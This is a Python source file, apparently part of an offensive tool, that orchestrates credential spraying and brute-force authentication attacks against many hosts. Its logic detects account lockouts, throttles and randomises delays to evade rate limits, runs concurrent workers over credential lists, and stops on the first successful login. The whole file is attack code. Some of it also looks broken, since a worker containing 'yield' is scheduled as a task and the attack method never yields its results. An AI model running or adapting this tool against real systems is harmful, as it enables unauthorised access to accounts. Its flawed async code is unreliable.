""Main orchestrator for credential spraying and brute force attacks."""
import asyncio
import logging
import random
from typing import List, Optional, Dict, Set, AsyncGenerator, Tuple
from datetime import datetime, timedelta
from dataclasses import dataclass, field

from .models import (
    Target, Credential, AuthResult, AttackProfile, AttackStats, 
    AuthResultStatus, ProtocolType
)
from .auth_handlers import AuthHandlerFactory

logger = logging.getLogger(__name__)

@dataclass
class TargetState:
    """Tracks the state of a target during an attack."""
    target: Target
    attempts: int = 0
    successes: int = 0
    last_attempt: Optional[datetime] = None
    lockout_detected: bool = False
    lockout_timestamp: Optional[datetime] = None
    recent_errors: List[Tuple[datetime, str]] = field(default_factory=list)
    
    def record_attempt(self, result: AuthResult):
        """Record an authentication attempt result."""
        self.attempts += 1
        self.last_attempt = datetime.utcnow()
        
        if result.status == AuthResultStatus.SUCCESS:
            self.successes += 1
        elif result.status == AuthResultStatus.LOCKED:
            self.lockout_detected = True
            self.lockout_timestamp = self.last_attempt
        elif result.status in (AuthResultStatus.ERROR, AuthResultStatus.RATE_LIMITED):
            self.recent_errors.append((self.last_attempt, str(result.error)))
            # Keep only errors from the last hour
            cutoff = datetime.utcnow() - timedelta(hours=1)
            self.recent_errors = [e for e in self.recent_errors if e[0] > cutoff]
    
    def should_throttle(self, profile: AttackProfile) -> bool:
        """Determine if we should throttle requests to this target."""
        if not profile.lockout_avoidance:
            return False
            
        # If we've detected a lockout, throttle for the observation window
        if self.lockout_detected:
            if self.lockout_timestamp:
                lockout_age = datetime.utcnow() - self.lockout_timestamp
                if lockout_age.total_seconds() < profile.lockout_observation_window:
                    return True
        
        # Check if we've hit the max attempts per account
        if self.attempts >= profile.max_attempts_per_account:
            return True
            
        # Check rate limiting based on recent errors
        if len(self.recent_errors) >= 3:  # If we've had 3 recent errors, throttle
            return True
            
        return False
    
    def get_delay(self, profile: AttackProfile) -> float:
        """Calculate the delay before the next attempt."""
        if not self.last_attempt:
            return 0
            
        min_delay, max_delay = profile.delay_between_attempts
        base_delay = random.uniform(min_delay, max_delay)
        
        # Increase delay if we've had recent errors
        error_penalty = min(len(self.recent_errors) * 2, 10)  # Up to 10x delay
        return base_delay * (1 + error_penalty)


class CredentialOrchestrator:
    """Orchestrates credential spraying and brute force attacks."""
    
    def __init__(self, profile: AttackProfile):
        self.profile = profile
        self.stats = AttackStats()
        self.target_states: Dict[str, TargetState] = {}
        self.lock = asyncio.Lock()
        self.active_tasks: Set[asyncio.Task] = set()
        self.running = False
        self._rate_limit_semaphore = asyncio.Semaphore(profile.rate_limit)
    
    async def add_targets(self, targets: List[Target]):
        """Add targets to the orchestrator."""
        async with self.lock:
            for target in targets:
                key = f"{target.host}:{target.port}"
                if key not in self.target_states:
                    self.target_states[key] = TargetState(target=target)
    
    async def process_credential(self, credential: Credential) -> List[AuthResult]:
        """Process a single credential against all targets."""
        results = []
        
        # Get a copy of targets to avoid modification during iteration
        async with self.lock:
            targets = [state.target for state in self.target_states.values() 
                      if not state.should_throttle(self.profile)]
        
        if not targets:
            logger.warning("No active targets available for credential %s", credential.username)
            return []
        
        # Process each target with rate limiting
        for target in targets:
            async with self._rate_limit_semaphore:
                result = await self._attempt_auth(target, credential)
                results.append(result)
                
                # Update stats
                self.stats.update_stats(result)
                
                # Update target state
                key = f"{target.host}:{target.port}"
                async with self.lock:
                    if key in self.target_states:
                        self.target_states[key].record_attempt(result)
                
                # Check if we should stop after first success
                if result.status == AuthResultStatus.SUCCESS and self.profile.stop_on_first_success:
                    logger.info("Success found, stopping as per profile configuration")
                    return results
                
                # Add delay between attempts
                if len(targets) > 1:  # Only delay between targets, not after the last one
                    await asyncio.sleep(self._get_delay_between_attempts())
        
        return results
    
    async def _attempt_auth(self, target: Target, credential: Credential) -> AuthResult:
        """Attempt authentication with proper error handling."""
        handler = AuthHandlerFactory.get_handler(target.protocol, target)
        if not handler:
            return AuthResult(
                target=target,
                credential=credential,
                status=AuthResultStatus.ERROR,
                response_time=0,
                error=f"No handler available for protocol: {target.protocol}"
            )
        
        try:
            async with handler:
                if not await handler.connect():
                    return AuthResult(
                        target=target,
                        credential=credential,
                        status=AuthResultStatus.ERROR,
                        response_time=0,
                        error="Failed to connect to target"
                    )
                
                return await handler.authenticate(credential)
                
        except Exception as e:
            logger.exception(f"Unexpected error during authentication: {str(e)}")
            return AuthResult(
                target=target,
                credential=credential,
                status=AuthResultStatus.ERROR,
                response_time=0,
                error=f"Unexpected error: {str(e)}"
            )
    
    def _get_delay_between_attempts(self) -> float:
        """Calculate delay between attempts based on profile."""
        min_delay, max_delay = self.profile.delay_between_attempts
        return random.uniform(min_delay, max_delay)
    
    async def run_attack(
        self, 
        credentials: List[Credential],
        max_concurrent: int = 10
    ) -> AsyncGenerator[AuthResult, None]:
        """Run the attack with the provided credentials."""
        if self.running:
            raise RuntimeError("Attack is already running")
            
        self.running = True
        self.stats = AttackStats()  # Reset stats
        
        # Create a queue of credentials to process
        credential_queue = asyncio.Queue()
        for cred in credentials:
            await credential_queue.put(cred)
        
        async def worker():
            """Worker process to handle credential processing."""
            while not credential_queue.empty() and self.running:
                try:
                    credential = await credential_queue.get()
                    try:
                        results = await self.process_credential(credential)
                        for result in results:
                            yield result
                    finally:
                        credential_queue.task_done()
                except Exception as e:
                    logger.exception(f"Error in worker: {str(e)}")
        
        # Create worker tasks
        tasks = []
        for _ in range(min(max_concurrent, len(credentials))):
            task = asyncio.create_task(worker())
            tasks.append(task)
            self.active_tasks.add(task)
            task.add_done_callback(self.active_tasks.discard)
        
        # Wait for all workers to complete
        await credential_queue.join()
        
        # Cancel any remaining tasks
        for task in tasks:
            if not task.done():
                task.cancel()
        
        # Wait for all tasks to complete
        if tasks:
            await asyncio.wait(tasks, return_when=asyncio.ALL_COMPLETED)
        
        self.running = False
        self.stats.finalize()
    
    async def stop(self):
        """Stop the attack gracefully."""
        self.running = False
        
        # Cancel all active tasks
        for task in list(self.active_tasks):
            if not task.done():
                task.cancel()
        
        # Wait for tasks to complete
        if self.active_tasks:
            await asyncio.wait(self.active_tasks, return_when=asyncio.ALL_COMPLETED)
        
        self.stats.finalize()
    
    def get_status(self) -> Dict:
        """Get the current status of the attack."""
        active_targets = sum(1 for state in self.target_states.values() 
                           if not state.should_throttle(self.profile))
        
        return {
            "running": self.running,
            "targets_total": len(self.target_states),
            "targets_active": active_targets,
            "stats": self.stats.dict(),
            "rate_limit": self.profile.rate_limit,
            "concurrent_tasks": len(self.active_tasks)
        }
